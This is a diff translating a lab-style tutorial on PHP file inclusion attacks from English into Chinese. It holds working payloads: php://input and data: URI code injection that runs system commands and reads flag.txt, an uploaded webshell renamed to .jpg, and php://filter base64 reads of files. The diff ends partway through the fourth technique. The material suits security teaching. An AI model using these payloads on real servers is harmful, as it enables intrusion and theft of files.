@@ -1,6 +1,6 @@
-## Summary of some common methods of file include attack.
+## 一些常见的文件包含漏洞的利用技法总结.
 
-File inclusion attacks are presented in server-side code in the form of:
+文件包含漏洞在服务器端代码中主要以下述形式的$php$代码呈现:
 
 ```php+HTML
 /*demo.php*/
@@ -10,31 +10,31 @@ File inclusion attacks are presented in server-side code in the form of:
 
 ```
 
-Here are a few ways to use it.
+这里我们给出一些利用漏洞的方法.
 
-### 1.Exploition of  php://input protocol
+### 1.php:://input伪协议的利用
 
-You can use the PHP pseudo-protocol php://input, often using the POST argument to take exploit it.
+我们可以利用$php$为协议, 一般在POST参数中构造我们想要注入的$php$语句.
 
-###### The GET parameter：
+###### GET 参数：
 
 ```http
 /?action=php://input
 ```
 
-###### The Post parameter
+###### Post 参数:
 
 ```php+HTML
 <?php system("dir"); ?>
 ```
 
-###### or
+###### 或者:
 
 ```php+HTML
 <?php echo file_get_contents("../../flag.txt");?>
 ```
 
-###### The full utilization payload is as follows
+###### http形式的完整注入payload如下:
 
 ```http
 POST /labs/IncludeAttack/demo.php/?action=php://input HTTP/1.1
@@ -51,17 +51,17 @@ Content-Length: 50
 <?php echo file_get_contents("../../flag.txt");?>
 ```
 
-Where, statements
+在这里, 语句
 
-```php+HTML
+```php
 file_get_contents('php://input');
 ```
 
-The argument string itself used to echo any POST.
+用于直接将POST参数本身作为字符串赋值或者回显.
 
-#### 2.Cooperate with upload attack
+#### 2.结合文件上传漏洞利用
 
-Among the file upload vulnerabilities, we have the Trojan virus:
+在文件上传漏洞中,我们构造木马$virus.php$:
 
 ```php
 /*virus.php*/
@@ -70,15 +70,17 @@ Among the file upload vulnerabilities, we have the Trojan virus:
 ?>
 ```
 
-Change its suffix to .jpg post-upload, now in the target server we have a executable virus.
+在上传过程中捕获数据包,将后缀改为 .jpg 从而绕过前端的检查, 在靶机/ 目标服务器中我们有了一份可执行的病毒文件.
 
-We can construct payload;
+我们构造payload:
 
-###### The GET&POST parameter
+###### GET参数
 
 ```http
 /?action=virus.jpg
 ```
+
+###### POST参数
 
 ```php
 pwd=system("dir");
@@ -86,21 +88,21 @@ pwd=system("dir");
 // or pwd= echo file_get_contents("../../flag.txt");
 ```
 
-#### 3.Explotion of php://filter
+#### 3.php://filter伪协议的利用
 
-###### The GET parameter
+###### GET 参数
 
 ```http
 php://filter/read=convert.base64-encode/resource=../../flag.txt
 ```
 
- The echo is the base64 encryption form of the document.
+ 回显内容是该路径下文件的base64加密格式.
 
-#### 4.Any executable codes injection
+#### 4.任意可执行文件注入
 
-We inject the byte stream of the PHP code we want to execute directly into the GET parameter, replacing the punctuation with %ord(byte).
+我们在GET参数中直接注入我们想让服务器执行的php脚本, 将特殊字符替换为 %ord(byte)的格式来解析从而避免闭合问题等.
 
-###### The GET parameter
+###### GET 参数
 
 ```http
 // data: text/plain,<?php system("dir");?>
